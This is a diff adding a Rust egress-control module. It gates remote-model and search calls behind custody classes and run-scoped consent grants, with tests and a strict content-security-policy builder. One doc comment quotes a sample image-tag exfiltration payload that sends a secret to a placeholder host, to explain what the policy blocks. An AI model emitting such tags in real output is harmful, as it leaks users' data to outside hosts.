@@ -1,0 +1,535 @@
+// SPDX-License-Identifier: AGPL-3.0-or-later
+//! The egress boundary — the ONE choke point every remote-model call
+//! and every search-query egress passes through (order
+//! deep-research-t2a, R10).
+//!
+//! Two facts are enforced here, structurally, never by a model:
+//!
+//! 1. **One construction site.** Every HTTP client that can carry a
+//!    payload to a third party is built by [`search_client`] or
+//!    [`model_client`] in THIS file. The F26 census
+//!    (`sovereign-core/tests/f26_egress_census.rs`) is the build gate:
+//!    a `reqwest::Client` construction anywhere else in the workspace
+//!    fails the census, and this file is registered `Boundary`.
+//!
+//! 2. **One release rule** ([`verify`], one decider, one name — ARCH
+//!    §10.6). A payload leaves this machine iff:
+//!      - its custody is `PublicWeb` (the bar's unconditional
+//!        release — web material is egress-releasable), OR
+//!      - a run-scoped [`ConsentGrant`] covers its custody (the
+//!        operator's typed grant, default-deny, recorded in the run
+//!        manifest), OR
+//!      - it is a QUERY formed verbatim by the user (`user_formed` —
+//!        the user's own words leaving at the user's own action; the
+//!        chat tool path).
+//!    Everything else refuses, typed, naming what was withheld.
+//!    `Unknown` custody always refuses (custody.rs: `Unknown` never
+//!    rides a released record).
+//!
+//! The consent grant is run-scoped and never a model judgment (§7.6):
+//! the CLI's `--consent <class>` flag builds it once at launch, it is
+//! frozen into the run's charter (FR-3), carried by the port, and
+//! recorded in `manifest.json` (`Manifest.consent`).
+//!
+//! Every egress event — released or refused — is traced at
+//! `tracing=debug` under this module's target: provider, payload
+//! class, exact-payload size, custody proof, and (when one released
+//! it) the grant's run id + release floor.
+
+use std::fmt;
+
+use serde::{Deserialize, Serialize};
+use tracing::debug;
+
+use crate::types::{Custody, SearchPrivacy};
+
+/// A run-scoped typed consent grant: the operator's release of a
+/// custody floor for ONE run. Default-deny — the absence of a grant
+/// releases nothing but public-web material. Recorded in the run
+/// manifest; never produced or amended by a model.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "kebab-case")]
+pub struct ConsentGrant {
+    /// The run this grant is scoped to (e.g. `dr-1786720584`).
+    pub run_id: String,
+    /// When the operator granted it (unix seconds).
+    pub granted_at_unix: i64,
+    /// The most restrictive custody class this grant releases:
+    /// `personal` covers all classes, `peer` covers peer + public-web,
+    /// `public-web` covers public-web only. A grant never releases
+    /// `unknown` provenance.
+    pub release_floor: Custody,
+}
+
+impl ConsentGrant {
+    /// True iff this grant releases payloads of the given custody: a
+    /// payload releases when it is AT MOST as restrictive as the
+    /// floor (`restrictiveness(payload) <= restrictiveness(floor)`).
+    /// Floor `public-web` (0) therefore releases public-web only;
+    /// floor `personal` (2) releases every non-unknown class. The
+    /// inverse comparison would let a public-web grant release
+    /// personal payloads — the test
+    /// `grant_floor_covers_and_refuses_by_class` pins the correct
+    /// direction.
+    pub fn covers(&self, payload: Custody) -> bool {
+        // ONE implementation of the custody ordering (ARCH §10.6). The
+        // comparison used to be a private `restrictiveness` fn in this file;
+        // it moved to `kernel_types::Custody` at rung nc-11-answer, when the
+        // MESH boundary (`PeerAnswer::bound_for_peer`) needed the same
+        // question answered and a second copy would have been the second
+        // decider. This method keeps its name — it is the third-party-egress
+        // spelling of the question — and delegates the rule.
+        payload.released_by(self.release_floor)
+    }
+}
+
+/// What is crossing the boundary. The caller declares every field by
+/// code (never by a model); `verify` decides on the declaration.
+#[derive(Debug, Clone)]
+pub struct EgressPayload<'a> {
+    /// The egress's privacy posture — consulted at the boundary
+    /// (`Local` never leaves; `External { provider }` names the
+    /// third party in the trace and the decision).
+    pub privacy: SearchPrivacy,
+    /// The payload's custody class. `PublicWeb` releases
+    /// unconditionally; anything else needs the grant (or the
+    /// user-formed-query clause).
+    pub custody: Custody,
+    /// What is leaving: `"chunk"` | `"query"` | `"url"`.
+    pub what: &'a str,
+    /// Where it is leaving to: the provider id for `External`
+    /// egress (the backend's stable audit id), or a host.
+    pub target: &'a str,
+    /// The exact payload content — the object of the decision (a
+    /// chunk, the query text, the URL). Traced truncated; the full
+    /// payload leaves only when the gate releases it.
+    pub detail: &'a str,
+    /// True iff the payload is a query formed verbatim by the user
+    /// (their own words leaving at their own action — the chat tool
+    /// path). Machine-formed queries (the loop's gap templates) are
+    /// never user-formed and need the run's grant.
+    pub user_formed: bool,
+}
+
+/// The typed refusal: what was withheld, why, and whether a grant
+/// existed. The caller surfaces the message verbatim so the operator
+/// sees exactly what the boundary refused and why.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct EgressRefusal {
+    pub custody: Custody,
+    pub what: String,
+    pub target: String,
+    pub grant_present: bool,
+    pub reason: String,
+}
+
+impl fmt::Display for EgressRefusal {
+    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
+        write!(
+            f,
+            "egress refused: {what} with {custody} custody to {target} — {reason} (grant {grant})",
+            what = self.what,
+            custody = self.custody,
+            target = self.target,
+            reason = self.reason,
+            grant = if self.grant_present {
+                "present but insufficient"
+            } else {
+                "absent — default-deny"
+            },
+        )
+    }
+}
+
+/// Why a payload was released by its custody clauses.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Release {
+    /// Public-web custody: the bar's unconditional release.
+    PublicWeb,
+    /// The run's consent grant covers the custody.
+    Grant,
+}
+
+/// Why a payload's custody clauses withheld it.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum Withheld {
+    /// Unknown provenance, which no grant releases.
+    UnknownProvenance,
+    /// Not public-web, and no grant.
+    NoGrant,
+    /// The grant's floor sits below this custody.
+    GrantBelow {
+        /// The most restrictive class the grant releases.
+        floor: Custody,
+    },
+}
+
+/// The custody clauses of the release rule, pure and in [`verify`]'s order:
+/// unknown provenance refuses, public-web releases, a covering grant
+/// releases, anything else refuses. A client that only needs the answer (an
+/// enrich run deciding what its envelope may declare) asks this, not
+/// `verify`, which also traces a payload and weighs the user-formed clause.
+pub fn release(custody: Custody, grant: Option<&ConsentGrant>) -> Result<Release, Withheld> {
+    match (custody, grant) {
+        (Custody::Unknown, _) => Err(Withheld::UnknownProvenance),
+        (Custody::PublicWeb, _) => Ok(Release::PublicWeb),
+        (_, Some(g)) if g.covers(custody) => Ok(Release::Grant),
+        (_, Some(g)) => Err(Withheld::GrantBelow {
+            floor: g.release_floor,
+        }),
+        (_, None) => Err(Withheld::NoGrant),
+    }
+}
+
+/// The release rule — one decider, one name. Returns the typed
+/// refusal when the payload may not leave; every path traces at
+/// `tracing=debug`. The custody clauses are [`release`]'s; this adds the
+/// privacy short circuit and the user-formed-query clause.
+pub fn verify(
+    payload: &EgressPayload<'_>,
+    grant: Option<&ConsentGrant>,
+) -> Result<(), EgressRefusal> {
+    // The privacy posture is consulted AT the boundary: Local egress
+    // never leaves the node (nothing to gate), Mesh rides the estate's
+    // own transport (out of this HTTP boundary's scope), External is
+    // third-party egress and faces the release rule.
+    let provider = match payload.privacy {
+        SearchPrivacy::Local => {
+            debug!(
+                target: "sovereign_core::egress",
+                what = payload.what,
+                custody = %payload.custody,
+                "egress: privacy Local — no third-party egress"
+            );
+            return Ok(());
+        }
+        SearchPrivacy::Mesh => {
+            debug!(
+                target: "sovereign_core::egress",
+                what = payload.what,
+                custody = %payload.custody,
+                "egress: privacy Mesh — peer transport, outside the HTTP boundary"
+            );
+            return Ok(());
+        }
+        SearchPrivacy::External { provider } => provider,
+    };
+
+    let reason = match release(payload.custody, grant) {
+        Ok(Release::PublicWeb) => {
+            debug!(
+                target: "sovereign_core::egress",
+                provider = %provider,
+                what = payload.what,
+                custody = %payload.custody,
+                payload_chars = payload.detail.len(),
+                detail = %truncate(payload.detail, 200),
+                "egress released — public-web custody"
+            );
+            return Ok(());
+        }
+        Ok(Release::Grant) => {
+            debug!(
+                target: "sovereign_core::egress",
+                provider = %provider,
+                what = payload.what,
+                custody = %payload.custody,
+                payload_chars = payload.detail.len(),
+                run = %grant.map_or("", |g| g.run_id.as_str()),
+                release_floor = ?grant.map(|g| g.release_floor),
+                detail = %truncate(payload.detail, 200),
+                "egress released — run consent grant"
+            );
+            return Ok(());
+        }
+        // Unknown provenance never egresses, whoever formed it.
+        Err(Withheld::UnknownProvenance) => "unknown provenance never egresses".to_string(),
+        // The user's own words, formed verbatim by the user — the chat
+        // tool path's release. Machine-formed payloads never hit this
+        // clause.
+        Err(Withheld::NoGrant | Withheld::GrantBelow { .. })
+            if payload.what == "query" && payload.user_formed =>
+        {
+            debug!(
+                target: "sovereign_core::egress",
+                provider = %provider,
+                what = payload.what,
+                custody = %payload.custody,
+                payload_chars = payload.detail.len(),
+                detail = %truncate(payload.detail, 200),
+                "egress released — user-formed query"
+            );
+            return Ok(());
+        }
+        Err(Withheld::NoGrant) => {
+            "no run consent grant — the boundary is default-deny for non-public-web payloads"
+                .to_string()
+        }
+        Err(Withheld::GrantBelow { floor }) => format!(
+            "grant {run} covers up to {floor}, not {custody}",
+            run = grant.map_or("", |g| g.run_id.as_str()),
+            custody = payload.custody,
+        ),
+    };
+    Err(refusal(payload, grant, reason))
+}
+
+fn refusal(
+    payload: &EgressPayload<'_>,
+    grant: Option<&ConsentGrant>,
+    reason: String,
+) -> EgressRefusal {
+    let refusal = EgressRefusal {
+        custody: payload.custody,
+        what: payload.what.to_string(),
+        target: payload.target.to_string(),
+        grant_present: grant.is_some(),
+        reason,
+    };
+    debug!(
+        target: "sovereign_core::egress",
+        custody = %refusal.custody,
+        what = %refusal.what,
+        target = %refusal.target,
+        grant_present = refusal.grant_present,
+        reason = %refusal.reason,
+        "egress refused — {refusal}"
+    );
+    refusal
+}
+
+fn truncate(s: &str, max: usize) -> String {
+    if s.chars().count() <= max {
+        s.to_string()
+    } else {
+        let cut: String = s.chars().take(max).collect();
+        format!("{cut}…[{} chars total]", s.chars().count())
+    }
+}
+
+/// The boundary's search client factory — the ONE construction site
+/// for clients that carry search-query egress. Callers (the
+/// deep-research port, the chat web tools, the knowledge-lookup
+/// tool) build through here and pass the client into their
+/// orchestrator; the census counts this site `Boundary`.
+pub fn search_client() -> Result<reqwest::Client, reqwest::Error> {
+    reqwest::Client::builder()
+        .timeout(std::time::Duration::from_secs(30))
+        .build()
+}
+
+/// The boundary's remote-model client factory — the ONE construction
+/// site for clients that carry chunk payloads to remote providers
+/// (the enrich `--provider` dispatch, the t2b frontier judge). The
+/// caller still declares payload custody + grant and calls [`verify`]
+/// before any request is built; this factory only builds the client.
+///
+/// The timeout is the CALLER's policy, passed in: enrich's chat path
+/// needs its documented 1800s hang headroom (Phase-1 extract on a
+/// 27B model can legitimately run 5–15 minutes; a shorter ceiling
+/// silently killed real SEP campaign requests, verified 2026-04-25),
+/// while a t2b judge call would pass something tighter. The census
+/// counts this one construction site `Boundary` regardless of the
+/// timeout passed.
+pub fn model_client(timeout: std::time::Duration) -> Result<reqwest::Client, reqwest::Error> {
+    reqwest::Client::builder().timeout(timeout).build()
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn payload(custody: Custody, what: &'static str, user_formed: bool) -> EgressPayload<'static> {
+        EgressPayload {
+            privacy: SearchPrivacy::External {
+                provider: "duckduckgo",
+            },
+            custody,
+            what,
+            target: "duckduckgo",
+            detail: "the exact payload",
+            user_formed,
+        }
+    }
+
+    /// The custody clauses alone, every class against no grant and each floor.
+    #[test]
+    fn release_is_a_table_over_custody_and_grant() {
+        let grant = |floor| ConsentGrant {
+            run_id: "run".into(),
+            granted_at_unix: 0,
+            release_floor: floor,
+        };
+        let (web, peer, personal) = (
+            grant(Custody::PublicWeb),
+            grant(Custody::Peer),
+            grant(Custody::Personal),
+        );
+        let below = |floor| Err(Withheld::GrantBelow { floor });
+        for (custody, none, at_web, at_peer, at_personal) in [
+            (
+                Custody::Unknown,
+                Err(Withheld::UnknownProvenance),
+                Err(Withheld::UnknownProvenance),
+                Err(Withheld::UnknownProvenance),
+                Err(Withheld::UnknownProvenance),
+            ),
+            (
+                Custody::PublicWeb,
+                Ok(Release::PublicWeb),
+                Ok(Release::PublicWeb),
+                Ok(Release::PublicWeb),
+                Ok(Release::PublicWeb),
+            ),
+            (
+                Custody::Peer,
+                Err(Withheld::NoGrant),
+                below(Custody::PublicWeb),
+                Ok(Release::Grant),
+                Ok(Release::Grant),
+            ),
+            (
+                Custody::Personal,
+                Err(Withheld::NoGrant),
+                below(Custody::PublicWeb),
+                below(Custody::Peer),
+                Ok(Release::Grant),
+            ),
+        ] {
+            assert_eq!(release(custody, None), none, "{custody} with no grant");
+            assert_eq!(
+                release(custody, Some(&web)),
+                at_web,
+                "{custody} at public-web"
+            );
+            assert_eq!(release(custody, Some(&peer)), at_peer, "{custody} at peer");
+            assert_eq!(
+                release(custody, Some(&personal)),
+                at_personal,
+                "{custody} at personal"
+            );
+        }
+    }
+
+    #[test]
+    fn public_web_always_releases_without_a_grant() {
+        assert!(verify(&payload(Custody::PublicWeb, "chunk", false), None).is_ok());
+        assert!(verify(&payload(Custody::PublicWeb, "url", false), None).is_ok());
+    }
+
+    #[test]
+    fn personal_chunk_refuses_without_a_grant() {
+        let err = verify(&payload(Custody::Personal, "chunk", false), None)
+            .expect_err("personal chunk must refuse");
+        assert!(err.to_string().contains("personal"), "{}", err);
+        assert!(err.to_string().contains("default-deny"), "{}", err);
+        assert!(!err.grant_present);
+    }
+
+    #[test]
+    fn grant_floor_covers_and_refuses_by_class() {
+        let public = ConsentGrant {
+            run_id: "dr-test".into(),
+            granted_at_unix: 1,
+            release_floor: Custody::PublicWeb,
+        };
+        // floor public-web: public-web payloads release, personal refuse.
+        assert!(verify(&payload(Custody::PublicWeb, "chunk", false), Some(&public)).is_ok());
+        let err = verify(&payload(Custody::Personal, "chunk", false), Some(&public))
+            .expect_err("floor public-web must refuse personal");
+        assert!(
+            err.to_string()
+                .contains("covers up to public-web, not personal"),
+            "{}",
+            err
+        );
+        assert!(err.grant_present);
+
+        let personal = ConsentGrant {
+            run_id: "dr-test".into(),
+            granted_at_unix: 1,
+            release_floor: Custody::Personal,
+        };
+        assert!(verify(&payload(Custody::Personal, "chunk", false), Some(&personal)).is_ok());
+        assert!(verify(&payload(Custody::Peer, "chunk", false), Some(&personal)).is_ok());
+    }
+
+    #[test]
+    fn unknown_custody_never_egresses() {
+        assert!(verify(&payload(Custody::Unknown, "chunk", false), None).is_err());
+        let g = ConsentGrant {
+            run_id: "dr-test".into(),
+            granted_at_unix: 1,
+            release_floor: Custody::Personal,
+        };
+        assert!(
+            verify(&payload(Custody::Unknown, "chunk", false), Some(&g)).is_err(),
+            "a grant never releases unknown provenance"
+        );
+    }
+
+    #[test]
+    fn user_formed_query_releases_machine_formed_query_refuses() {
+        assert!(verify(&payload(Custody::Personal, "query", true), None).is_ok());
+        let err = verify(&payload(Custody::Personal, "query", false), None)
+            .expect_err("a machine-formed query needs the run's grant");
+        assert!(err.to_string().contains("default-deny"), "{}", err);
+    }
+
+    #[test]
+    fn local_privacy_never_touches_the_release_rule() {
+        let mut p = payload(Custody::Unknown, "chunk", false);
+        p.privacy = SearchPrivacy::Local;
+        // Local egress is not third-party egress — nothing to gate.
+        assert!(verify(&p, None).is_ok());
+    }
+}
+
+/// Where a served page may connect to — the ONE difference between the two
+/// surfaces that serve a person HTML (ROOT_CAUSE_FIXES B2).
+///
+/// The base directives are one builder (`csp`): both surfaces want the same
+/// restraint. What they want DIFFERENTLY is exactly one directive, so that
+/// difference is a parameter here rather than a second policy to drift
+/// (one decider; and a merged union of both would loosen both surfaces):
+///
+/// - [`ConnectSrc::Ipc`] — the desktop's mesh-app window: the gated Tauri
+///   bridge and nothing else. `'self'` is deliberately absent: the window's
+///   documented rule is that the only path to the host is the bridge, and
+///   `connect-src 'self'` would hand every bundled app same-origin fetch.
+/// - [`ConnectSrc::SameOrigin`] — the LAN guest door: pages fetch their own
+///   host's API and nothing else. `ipc:` is deliberately absent: in Chrome
+///   and Firefox `*.localhost` resolves to the LOOKER's own loopback, so IPC
+///   origins on a stranger's page point at the stranger's own machine —
+///   a phish-shaped hole, not a capability.
+///
+/// Both close the exfiltration class a rendered answer opens
+/// (`<img src=https://x/?q=SECRET>` and kin): no remote origin in any
+/// directive, `object-src 'none'`, `base-uri 'self'`, `form-action 'none'`,
+/// no inline/eval scripts.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ConnectSrc {
+    /// The desktop's `window.meshApp` IPC scheme (macOS/Linux custom scheme,
+    /// and the Windows/Android http form).
+    Ipc,
+    /// The serving origin's own API — the guest door's pages.
+    SameOrigin,
+}
+
+/// The one content-security-policy builder for every surface that serves a
+/// person HTML. Set by the door's router as a response layer (every
+/// door-served response — refusals and proxied app responses included — and
+/// appended, so an app's own stricter policy still counts) and by the
+/// desktop's `meshapp_open`. The census over the door is
+/// `sovereign-daemon/src/tests/guest_door.rs::every_door_served_response_carries_the_csp`.
+pub fn csp(connect: ConnectSrc) -> String {
+    let src = match connect {
+        ConnectSrc::Ipc => "ipc: http://ipc.localhost",
+        ConnectSrc::SameOrigin => "'self'",
+    };
+    format!(
+        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; \
+         img-src 'self' data:; connect-src {src}; object-src 'none'; \
+         base-uri 'self'; form-action 'none'"
+    )
+}
